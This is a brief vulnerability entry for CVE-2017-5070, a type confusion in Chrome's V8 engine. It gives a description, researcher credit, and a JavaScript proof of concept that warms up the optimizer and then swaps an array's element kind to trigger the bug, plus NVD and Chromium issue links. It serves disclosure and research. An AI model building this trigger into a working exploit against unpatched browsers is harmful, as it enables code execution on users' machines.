# CVE-2017-5070
* Date : Apr 2019
* Credit : Zhao Qixun(@S0rryMybad) of Qihoo 360 Vulcan Team

## Description
Type confusion in V8 in Google Chrome prior to 59.0.3071.86 for Linux, Windows, and Mac, and 59.0.3071.92 for Android, allowed a remote attacker to execute arbitrary code inside a sandbox via a crafted HTML page.

## PoC
```js
var array = [[{}], [1.1]];

function transition() {
  for(var i = 0; i < array.length; i++){
    var arr = array[i];
    arr[0] = {};
  }
}

var double_arr2 = [1.1,2.2];

var flag = 0;
function swap() {
  try {} catch(e) {}  // Prevent Crankshaft from inlining this.
  if (flag == 1) {
    array[1] = double_arr2;
  }
}

var expected = 6.176516726456e-312;
function f(){
  swap();
  double_arr2[0] = 1;
  transition();
  double_arr2[1] = expected;
}

// %OptimizeFunctionOnNextCall(f);
for(var i = 0; i < 0x10000; i++) {
  f();
}
flag = 1;
f();
assertEquals(expected, double_arr2[1]);
```

## Reference
[NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-5070)
[issue 722756](https://bugs.chromium.org/p/chromium/issues/detail?id=722756)
[Chrome 58.0.3029.110](https://filehippo.com/download_google_chrome/75223/)